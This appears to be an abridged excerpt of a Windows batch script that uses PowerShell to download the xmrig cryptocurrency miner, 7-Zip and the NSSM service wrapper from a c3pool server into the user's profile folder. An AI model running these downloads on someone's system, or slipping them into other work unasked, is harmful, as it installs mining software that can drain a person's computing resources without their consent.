...
powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('http://download.c3pool.com/xmrig_setup/raw/master/xmrig.zip', '%USERPROFILE%\xmrig.zip')"
if errorlevel 1 (
...
if errorlevel 1 (
  ...
  powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('http://download.c3pool.com/xmrig_setup/raw/master/7za.exe', '%USERPROFILE%\7za.exe')"
  if errorlevel 1 (
...
powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('http://download.c3pool.com/xmrig_setup/raw/master/nssm.zip', '%USERPROFILE%\nssm.zip')"
if errorlevel 1 (
